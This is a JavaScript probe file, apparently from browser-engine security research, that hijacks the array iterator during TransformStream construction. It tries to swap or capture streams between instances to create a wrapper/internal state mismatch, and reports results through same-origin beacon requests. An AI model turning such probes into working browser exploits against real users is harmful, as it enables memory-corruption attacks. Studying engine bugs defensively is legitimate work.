/*
 * p429 -- TransformStream stream-swap via iterator override
 *
 * The C++ SequenceConverter at TransformStream.cpp:114 iterates the JS
 * return array via Symbol.iterator. The jsDynamicCast at lines 121-122
 * checks for JSReadableStream/JSWritableStream. If we return REAL streams
 * from a DIFFERENT TransformStream, we pass the type check but create
 * a state mismatch between C++ wrapper and JS internal state.
 *
 * Test A: Count iterator calls during construction (diagnostic)
 * Test B: Swap streams between two TransformStream instances
 * Test C: Race with start callback + iterator
 * Test D: Proxy-based transformer with iterator override
 * Test E: WritableStream/ReadableStream constructor iterator paths
 *
 * Beacon prefix: V429-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V429-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

// ================================================================
// Test A: Count all Symbol.iterator calls during TS construction
// ================================================================

function testA() {
  B("A-START");

  if (typeof TransformStream === "undefined") {
    B("A-NO-TS");
    return;
  }

  var calls = [];
  var callIdx = 0;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    var id = callIdx++;
    var isArray = Array.isArray(self);
    var len = 0;
    try { len = self.length; } catch(e) {}

    var types = [];
    if (isArray) {
      for (var i = 0; i < Math.min(len, 5); i++) {
        try { types.push(typeof self[i]); } catch(e) { types.push("err"); }
      }
    }

    calls.push({
      id: id,
      isArr: isArray,
      len: len,
      types: types.join(","),
      ctor: self.constructor ? self.constructor.name : "?"
    });

    // Use original iterator so construction succeeds
    return origIter.call(self);
  };

  try {
    var ts = new TransformStream();
    B("A-CREATED", typeof ts);
  } catch(e) {
    B("A-ERR", e.message.slice(0, 80));
  }

  Array.prototype[Symbol.iterator] = origIter;

  B("A-CALLS", {count: calls.length, details: calls.slice(0, 10)});
}

// ================================================================
// Test B: Stream swap -- return TS1 streams for TS2 construction
// ================================================================

function testB() {
  B("B-START");

  if (typeof TransformStream === "undefined") {
    B("B-NO-TS");
    return;
  }

  // Step 1: Create TS1 normally
  var ts1;
  try {
    ts1 = new TransformStream({
      transform: function(chunk, controller) {
        // TS1 doubles the value
        controller.enqueue("TS1:" + chunk);
      }
    });
    B("B-TS1-OK");
  } catch(e) {
    B("B-TS1-ERR", e.message.slice(0, 60));
    return;
  }

  // Step 2: Override iterator for TS2 construction
  // We need to know which call# returns [internalTS, readable, writable]
  // From testA we'll know the pattern. For now, try intercepting the
  // 3-element array return.
  var callNum = 0;
  var swapped = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    callNum++;

    // The C++ SequenceConverter iterates the 3-element return array
    // Look for the array that has exactly 3 elements where [1] and [2]
    // might be stream objects
    if (Array.isArray(self) && self.length === 3) {
      // This might be [internalTransformStream, readable, writable]
      // Swap readable/writable with TS1's
      try {
        var item1type = self[1] && self[1].constructor ? self[1].constructor.name : "?";
        var item2type = self[2] && self[2].constructor ? self[2].constructor.name : "?";

        B("B-INTERCEPT", {
          callNum: callNum,
          types: [typeof self[0], item1type, item2type]
        });

        if (item1type === "ReadableStream" && item2type === "WritableStream") {
          // Replace with TS1's streams
          var fakeArr = [self[0], ts1.readable, ts1.writable];
          swapped = true;
          B("B-SWAPPED");
          return origIter.call(fakeArr);
        }
      } catch(e) {}
    }

    return origIter.call(self);
  };

  var ts2;
  try {
    ts2 = new TransformStream({
      transform: function(chunk, controller) {
        controller.enqueue("TS2:" + chunk);
      }
    });
    B("B-TS2-OK", {swapped: swapped});
  } catch(e) {
    B("B-TS2-ERR", {msg: e.message.slice(0, 60), swapped: swapped});
  }

  Array.prototype[Symbol.iterator] = origIter;

  if (!ts2) return;

  // Step 3: Test if the streams are mismatched
  try {
    // ts2.readable should be TS1's readable if swap worked
    var r2name = ts2.readable.constructor.name;
    var w2name = ts2.writable.constructor.name;
    B("B-TS2-STREAMS", {readable: r2name, writable: w2name, swapped: swapped});

    // Write to ts2.writable -- if swapped, this goes to TS1's writable
    var writer = ts2.writable.getWriter();
    var reader = ts2.readable.getReader();

    writer.write("HELLO").then(function() {
      B("B-WRITE-OK");
    }).catch(function(e) {
      B("B-WRITE-ERR", e.message.slice(0, 60));
    });

    reader.read().then(function(result) {
      B("B-READ", {
        done: result.done,
        value: String(result.value).slice(0, 80)
      });
    }).catch(function(e) {
      B("B-READ-ERR", e.message.slice(0, 60));
    });
  } catch(e) {
    B("B-USE-ERR", e.message.slice(0, 60));
  }
}

// ================================================================
// Test C: Iterator override targeting JS builtin destructuring
// The JS builtin at TransformStreamInternals.js:85 destructures:
//   const [readable, writable] = @initializeTransformStream(...)
// This fires Symbol.iterator on a 2-element [ReadableStream, WritableStream]
// ================================================================

function testC() {
  B("C-START");

  if (typeof TransformStream === "undefined") {
    B("C-NO-TS");
    return;
  }

  var ts1;
  try {
    ts1 = new TransformStream();
    B("C-TS1-OK");
  } catch(e) {
    B("C-TS1-ERR", e.message.slice(0, 60));
    return;
  }

  // Override iterator targeting the 2-element array from @initializeTransformStream
  var callNum = 0;
  var intercepted2 = false;
  var intercepted3 = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    callNum++;

    if (Array.isArray(self)) {
      // 2-element: JS builtin destructuring [readable, writable]
      if (self.length === 2) {
        try {
          var t0 = self[0] && self[0].constructor ? self[0].constructor.name : "?";
          var t1 = self[1] && self[1].constructor ? self[1].constructor.name : "?";
          B("C-2ELEM", {callNum: callNum, types: [t0, t1]});

          if (t0 === "ReadableStream" && t1 === "WritableStream") {
            intercepted2 = true;
            // Swap with TS1 streams at the JS level
            var fake = [ts1.readable, ts1.writable];
            return origIter.call(fake);
          }
        } catch(e) {}
      }

      // 3-element: C++ SequenceConverter [internal, readable, writable]
      if (self.length === 3) {
        try {
          var t1 = self[1] && self[1].constructor ? self[1].constructor.name : "?";
          var t2 = self[2] && self[2].constructor ? self[2].constructor.name : "?";
          B("C-3ELEM", {callNum: callNum, types: [typeof self[0], t1, t2]});

          if (t1 === "ReadableStream" && t2 === "WritableStream") {
            intercepted3 = true;
            // DON'T swap here -- let C++ get the (now TS1) streams
            // from the return value (which was built with our swapped vars)
          }
        } catch(e) {}
      }
    }

    return origIter.call(self);
  };

  var ts2;
  try {
    ts2 = new TransformStream();
    B("C-TS2-OK", {int2: intercepted2, int3: intercepted3});
  } catch(e) {
    B("C-TS2-ERR", {msg: e.message.slice(0, 60), int2: intercepted2, int3: intercepted3});
  }

  Array.prototype[Symbol.iterator] = origIter;

  if (!ts2) return;

  // If the 2-element swap worked, TS2's JS internals use TS1's streams
  // but TS2's C++ wrapper has TS2's own streams (or TS1's if 3-elem also swapped)
  // Try writing data and see which transform callback runs
  try {
    var writer2 = ts2.writable.getWriter();
    var reader2 = ts2.readable.getReader();

    writer2.write("TEST-C").catch(function(e) {
      B("C-WRITE-ERR", e.message.slice(0, 60));
    });

    reader2.read().then(function(result) {
      B("C-READ", {
        done: result.done,
        value: String(result.value).slice(0, 60)
      });
    }).catch(function(e) {
      B("C-READ-ERR", e.message.slice(0, 60));
    });
  } catch(e) {
    B("C-USE-ERR", e.message.slice(0, 60));
  }
}

// ================================================================
// Test D: Proxy transformer -- intercept ALL property accesses
// ================================================================

function testD() {
  B("D-START");

  if (typeof TransformStream === "undefined") {
    B("D-NO-TS");
    return;
  }

  var accesses = [];
  var transformer = new Proxy({
    start: function(controller) {
      B("D-START-CB", typeof controller);
      // Store controller for later
      testD.controller = controller;
    },
    transform: function(chunk, controller) {
      controller.enqueue(chunk);
    }
  }, {
    get: function(target, prop, receiver) {
      accesses.push(String(prop));
      return target[prop];
    },
    has: function(target, prop) {
      accesses.push("has:" + String(prop));
      return prop in target;
    }
  });

  try {
    var ts = new TransformStream(transformer);
    B("D-CREATED", {accesses: accesses});
  } catch(e) {
    B("D-ERR", {msg: e.message.slice(0, 60), accesses: accesses});
  }
}

// ================================================================
// Test E: Override iterator + Proxy transformer combo
// Check if start callback runs before or after C++ type check
// ================================================================

function testE() {
  B("E-START");

  if (typeof TransformStream === "undefined") {
    B("E-NO-TS");
    return;
  }

  var phase = "init";
  var stolenReadable = null;
  var stolenWritable = null;
  var callCount = 0;

  // Override to steal real streams from 2-element return
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    callCount++;

    if (Array.isArray(self) && self.length === 2 && phase === "construct") {
      try {
        var t0 = self[0] && self[0].constructor ? self[0].constructor.name : "?";
        var t1 = self[1] && self[1].constructor ? self[1].constructor.name : "?";
        if (t0 === "ReadableStream" && t1 === "WritableStream") {
          stolenReadable = self[0];
          stolenWritable = self[1];
          B("E-STOLEN", {call: callCount});
        }
      } catch(e) {}
    }

    return origIter.call(self);
  };

  phase = "construct";
  var ts;
  try {
    ts = new TransformStream({
      start: function(controller) {
        B("E-START-CB", {phase: phase, stolen: !!stolenReadable});
        // At this point we have stolen the real streams
        // Can we do something with them?
        if (stolenReadable) {
          // Try to lock the stolen readable
          try {
            var reader = stolenReadable.getReader();
            B("E-LOCKED-STOLEN", typeof reader);
            // Read from it
            reader.read().then(function(r) {
              B("E-STOLEN-READ", {done: r.done, val: typeof r.value});
            });
            // Release lock
            reader.releaseLock();
          } catch(e) {
            B("E-LOCK-ERR", e.message.slice(0, 60));
          }
        }
      },
      transform: function(chunk, controller) {
        controller.enqueue("E:" + chunk);
      }
    });
    B("E-CREATED");
  } catch(e) {
    B("E-ERR", e.message.slice(0, 60));
  }

  Array.prototype[Symbol.iterator] = origIter;

  if (!ts) return;

  // Check if ts.readable is the same as stolenReadable
  try {
    B("E-SAME", {
      readableSame: ts.readable === stolenReadable,
      writableSame: ts.writable === stolenWritable
    });
  } catch(e) {
    B("E-CMP-ERR", e.message.slice(0, 60));
  }
}

// ================================================================
// Test F: QueuingStrategy size callback with iterator override
// The size callback runs during enqueue, could modify iterator
// ================================================================

function testF() {
  B("F-START");

  if (typeof TransformStream === "undefined") {
    B("F-NO-TS");
    return;
  }

  var sizeCallCount = 0;
  var ts;
  try {
    ts = new TransformStream(
      {
        transform: function(chunk, controller) {
          controller.enqueue(chunk);
        }
      },
      // writable strategy
      { highWaterMark: 1, size: function(chunk) {
          sizeCallCount++;
          B("F-SIZE-W", {call: sizeCallCount, type: typeof chunk});
          return 1;
        }
      },
      // readable strategy
      { highWaterMark: 1, size: function(chunk) {
          sizeCallCount++;
          B("F-SIZE-R", {call: sizeCallCount, type: typeof chunk});
          // Inside size callback, try to mutate the stream
          return 1;
        }
      }
    );
    B("F-CREATED");
  } catch(e) {
    B("F-ERR", e.message.slice(0, 60));
    return;
  }

  // Write data to trigger size callbacks
  try {
    var writer = ts.writable.getWriter();
    var reader = ts.readable.getReader();

    writer.write("TEST-F");
    reader.read().then(function(r) {
      B("F-READ", {done: r.done, val: String(r.value).slice(0, 40)});
    });
  } catch(e) {
    B("F-USE-ERR", e.message.slice(0, 60));
  }
}

testA();
testB();
testC();
testD();
testE();
testF();

setTimeout(function() { B("DONE"); }, 3000);
})();
